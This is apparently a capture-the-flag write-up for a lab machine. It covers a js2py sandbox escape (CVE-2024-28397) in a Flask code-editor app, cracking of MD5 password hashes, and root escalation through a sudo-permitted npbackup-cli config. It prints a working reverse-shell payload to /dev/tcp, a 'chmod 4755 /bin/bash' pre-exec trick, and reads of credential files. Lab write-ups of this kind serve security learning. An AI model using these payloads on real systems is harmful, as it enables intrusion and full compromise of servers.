## IP-Address
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```IP-Address
10.10.11.82
```
## RustScan
```bash
PORT     STATE SERVICE  REASON
22/tcp   open  ssh      syn-ack ttl 63
8000/tcp open  http-alt syn-ack ttl 63
```

## Browser 
Lets Explore on the Browser where page represent as the code editor and just like VS Code but before that we need to register & then Login to test the code-editor
then we tried some of the code to run and the output of that
```code
var x =16 
x;
```
Output = 16
## Downloadable Files
Before login there is an options to Download the zip files which is named as `app.zip` and after unzipping the files we got 
```bash
$ unzip app.zip
Archive:  app.zip
   creating: app/
   creating: app/templates/
  inflating: app/templates/login.html  
  inflating: app/templates/dashboard.html  
  inflating: app/templates/reviews.html  
  inflating: app/templates/register.html  
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/requirements.txt    
   creating: app/static/
   creating: app/static/js/
  inflating: app/static/js/script.js  
   creating: app/static/css/
  inflating: app/static/css/styles.css  
  inflating: app/app.py              
   creating: app/instance/
  inflating: app/instance/users.db   
```
## Analyzing the Code
Lets Analyze the `app.py` which describes about the code functionality 
```python
$ cat app.py   
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = '[secret key omitted]'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)

```

This tells about the editor code functionality & also look for the Requirements of the application
```bash
$ cat requirements.txt 
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```
And for `User.db` which is 
```bash
─$ strings users.db         
SQLite format 3
Wtablecode_snippetcode_snippet
CREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
Ctableuseruser
CREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
indexsqlite_autoindex_user_1user
```
which tells us about the database and we Discovered about the CVE
## CVE 
#CVE-2024-28397
through this we got the Reverse shell
## Reverse Shell
```Payload
// CVE-2024-28397 → js2py sandbox escape → Popen → reverse shell
let cmd = "bash -c 'bash -i >& /dev/tcp/10.10.16.24/4444 0>&1'";
let hacked, bymarve, n11;
let getattr, obj;

// Step 1: Access Python's internal attributes through JS objects
hacked = Object.getOwnPropertyNames({});
bymarve = hacked.__getattribute__;
n11 = bymarve("__getattribute__");

// Step 2: Get to Python's base object class
obj = n11("__class__").__base__;
getattr = obj.__getattribute__;

// Step 3: Recursive function to find subprocess.Popen in Python's class hierarchy
function findpopen(o) {
  let result;
  for (let i in o.__subclasses__()) {
    let item = o.__subclasses__()[i];
    if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
      return item;
    }
    if (item.__name__ != "type" && (result = findpopen(item))) {
      return result;
    }
  }
}

// Step 4: Execute the reverse shell command
findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate();
"OK";
```

## Access
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.24] from (UNKNOWN) [10.10.11.82] 36418
bash: cannot set terminal process group (857): Inappropriate ioctl for device
bash: no job control in this shell
app@codetwo:~/app$ 
```
Got the Reverse shell

## Enumeration
```bash
app@codetwo:~/app$ whoami
whoami
app
app@codetwo:~/app$ id
id
uid=1001(app) gid=1001(app) groups=1001(app)
app@codetwo:~/app$ ls -la
ls -la
total 32
drwxrwxr-x 6 app app 4096 Feb 23 05:18 .
drwxr-x--- 5 app app 4096 Apr  6 03:22 ..
-rw-r--r-- 1 app app 3675 Feb  1  2025 app.py
drwxrwxr-x 2 app app 4096 Aug 24 09:44 instance
drwxr-xr-x 2 app app 4096 Feb  1  2025 __pycache__
-rw-rw-r-- 1 app app   49 Jan 17  2025 requirements.txt
drwxr-xr-x 4 app app 4096 Jun 11 07:51 static
drwxr-xr-x 2 app app 4096 Jun 26 13:43 templates
app@codetwo:~/app$ cd __pycache__
cd __pycache__
app@codetwo:~/app/__pycache__$ ls -la
ls -la
total 12
drwxr-xr-x 2 app app 4096 Feb  1  2025 .
drwxrwxr-x 6 app app 4096 Feb 23 05:18 ..
-rw-r--r-- 1 app app 4077 Feb  1  2025 app.cpython-38.pyc
```
Explore more of it
```bash
strings app.cpython-38.pyc
d d!
d#d$
d&d'
d)d*
j$d,d-d.
Flask
render_template
request
redirect
url_for
session
jsonify
send_from_directory)
SQLAlchemyNZ
[secret key omitted]z
sqlite:///users.dbZ
SQLALCHEMY_DATABASE_URIFZ
SQLALCHEMY_TRACK_MODIFICATIONSc
UserT
primary_key
unique
nullable
__name__
__module__
__qualname__
Column
Integer
String
username
password_hash
/home/app/app/app.pyr
CodeSnippetTr
user.idFr
ForeignKey
user_idZ
Text
coder
index.html)
index
/dashboardc
dashboard.html)
codes
login)
query
        filter_by
allr
user_codesr
        dashboard
z       /register
POST)
methodsc
password
register.html)
method
form
hashlib
encode
        hexdigestr
commitr
new_userr
register$
/loginc
)       Nr*
Invalid credentialsz
login.html)
firstr
userr
/logoutc
popr
logout>
/save_codec
)       Nr
messagez
Code saved successfully
error
User not logged in
json
getr
new_coder
        save_codeC
z       /downloadc
/home/app/app/static/z
app.zipT)
Z       directory
pathZ
as_attachment)
downloadM
/delete_code/<int:code_id>c
)       Nr
Code deleted successfullyr<
Code not foundi
deleter5
code_idr 
delete_codeQ
z       /run_codec
resultr<
js2pyZ
eval_jsr
        Exception
str)
run_code\
__main__z
0.0.0.0T)
host
debug)%Z
flaskr
flask_sqlalchemyr
osr?
disable_pyimportr
appZ
secret_key
configr
Modelr
router"
app_contextZ
create_all
runr
<module>
```

Got Some Credentials About SQLite3
```Credentials
send_from_directory)
SQLAlchemyNZ
[secret key omitted]z
sqlite:///users.dbZ
SQLALCHEMY_DATABASE_URIFZ
SQLALCHEMY_TRACK_MODIFICATIONSc
```

Also Getting more information from the database
```bash
app@codetwo:~/app$ cd instance
cd instance
app@codetwo:~/app/instance$ ls
ls
users.db
app@codetwo:~/app/instance$ cat users.db
cat users.db
�O�O�J%%�Wtablecode_snippetcode_snippetCREATE TABLE code_snippet (
        id INTEGER NOT NULL, 
        user_id INTEGER NOT NULL, 
        code TEXT NOT NULL, 
        PRIMARY KEY (id), 
        FOREIGN KEY(user_id) REFERENCES user (id)
)�0�CtableuseruserCREATE TABLE user (
        id INTEGER NOT NULL, 
        username VARCHAR(80) NOT NULL, 
        password_hash VARCHAR(128) NOT NULL, 
        PRIMARY KEY (id), 
        UNIQUE (username)
���'Mappa[hash omitted])Mmarco[hash omitted]
app@codetwo:~/app/instance$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
marco:x:1000:1000:marco:/home/marco:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
app:x:1001:1001:,,,:/home/app:/bin/bash
mysql:x:114:118:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:997:997::/var/log/laurel:/bin/false
app@codetwo:~/app/instance$ 
```

Got The SSH Credentials
## SSH
```Credentials
Mappa[hash omitted])
Mmarco[hash omitted]
```
these two are md5 sum which can be cracked using `john` or `crackstation`
and got the password
```Credentials
Mappa : Not Found 
Marco : [password omitted]
```
SSH Login 
```bash
$ ssh marco@10.10.11.82
marco@10.10.11.82's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
```

## User Flag
```bash
marco@codetwo:~$ ls
backups  npbackup.conf  user.txt
marco@codetwo:~$ cat user.txt
[flag omitted]
```
### Flag
```Flag
[flag omitted]
```
Lets Go for Privilege Escalation
```bash
marco@codetwo:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/at
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/su
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
Look For More
```bash
marco@codetwo:~/.ssh$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

## Root
Copy the `conf` file and edit it
```bash
marco@codeparttwo:~$ cp npbackup.conf root.conf
```

```bash
marco@codeparttwo:~$ nano root.conf 

```
File After editing the file

```bash
cat root.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
	  - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: "chmod 4755 /bin/bash"
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}

```
and after this executes the command
```bash
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c root.conf -b
2025-09-04 13:37:02,478 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-09-04 13:37:02,498 :: INFO :: Loaded config B4160295 in /home/marco/root.conf
2025-09-04 13:37:02,506 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-09-04 13:37:04,191 :: INFO :: Snapshots listed successfully
2025-09-04 13:37:04,192 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2025-09-04 13:37:04,192 :: INFO :: Runner took 1.686101 seconds for has_recent_snapshot
2025-09-04 13:37:04,192 :: INFO :: Running backup of ['/home/app/app/', '/root'] to repo default
2025-09-04 13:37:04,245 :: INFO :: Pre-execution of command chmod 4755 /bin/bash succeeded with:
None
2025-09-04 13:37:05,055 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-09-04 13:37:05,055 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-09-04 13:37:05,055 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-09-04 13:37:05,055 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-09-04 13:37:05,056 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-09-04 13:37:05,056 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-09-04 13:37:05,056 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-09-04 13:37:05,056 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-09-04 13:37:05,056 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          27 new,     0 changed,     0 unmodified
Dirs:           17 new,     0 changed,     0 unmodified
Added to the repository: 240.654 KiB (60.324 KiB stored)

processed 27 files, 246.625 KiB in 0:00
snapshot 0d8ea96b saved
2025-09-04 13:37:05,927 :: INFO :: Backend finished with success
2025-09-04 13:37:05,928 :: INFO :: Processed 246.6 KiB of data
2025-09-04 13:37:05,929 :: ERROR :: Backup is smaller than configured minmium backup size
2025-09-04 13:37:05,929 :: ERROR :: Operation finished with failure
2025-09-04 13:37:05,929 :: INFO :: Runner took 3.42367 seconds for backup
2025-09-04 13:37:05,929 :: INFO :: Operation finished
2025-09-04 13:37:05,934 :: INFO :: ExecTime = 0:00:03.457589, finished, state is: errors.

```
Got the confirmation of the successfully executes the code
and then run 
```bash
marco@codeparttwo:~$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
marco@codeparttwo:~$ /bin/bash -p
bash-5.0# kls
bash: kls: command not found
bash-5.0# ls
backups  npbackup.conf  root.conf  user.txt
bash-5.0# cd /root
bash-5.0# ls
root.txt  scripts
bash-5.0# cat root.txt
[flag omitted]
bash-5.0# 
```

## Root Flag
```flag
[flag omitted]
```

## Escalation
```bash
bash-5.0# ls
root.txt  scripts
bash-5.0# ls -la
total 40
drwx------  7 root root 4096 Sep  4 10:04 .
drwxr-xr-x 18 root root 4096 Nov 16  2024 ..
lrwxrwxrwx  1 root root    9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwx------  3 root root 4096 Sep  4 13:09 .cache
drwxr-xr-x  3 root root 4096 Apr  6 04:11 .local
lrwxrwxrwx  1 root root    9 Apr  6 03:59 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
lrwxrwxrwx  1 root root    9 Oct 26  2024 .python_history -> /dev/null
-rw-r-----  1 root root   33 Sep  4 10:04 root.txt
drwxr-xr-x  2 root root 4096 Jun 18 11:24 scripts
lrwxrwxrwx  1 root root    9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------  2 root root 4096 Apr  6 04:00 .ssh
drwxr-xr-x  2 root root 4096 Jun 26 13:44 .vim
bash-5.0# cd .ssh
bash-5.0# ls -la
total 16
drwx------ 2 root root 4096 Apr  6 04:00 .
drwx------ 7 root root 4096 Sep  4 10:04 ..
-rw-r--r-- 1 root root  566 Apr  6 04:00 authorized_keys
-rw------- 1 root root 2602 Apr  6 04:00 id_rsa
bash-5.0# cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```
Got the id_rsa 
```id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
[private key omitted]
-----END OPENSSH PRIVATE KEY-----
```

Got the Root
```bash
(kali㉿kali)-[~]
└─$ nano id_rsa         
└─$ chmod 600 id_rsa         
└─$ ssh -i id_rsa root@10.10.11.82                            
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
 System information as of Thu 04 Sep 2025 01:41:40 PM UTC
  System load:  0.06              Processes:             236
  Usage of /:   57.9% of 5.08GB   Users logged in:       1
  Memory usage: 25%               IPv4 address for eth0: 10.10.11.82
  Swap usage:   0%
Expanded Security Maintenance for Infrastructure is not enabled.
0 updates can be applied immediately.
Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status
The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
Last login: Thu Sep 4 13:41:41 2025 from 10.10.16.73
root@codeparttwo:~# ls 
root.txt  scripts
root@codeparttwo:~# cat root.txt
[flag omitted]
root@codeparttwo:~# 
```

## Root Flag
```Flag
[flag omitted]
```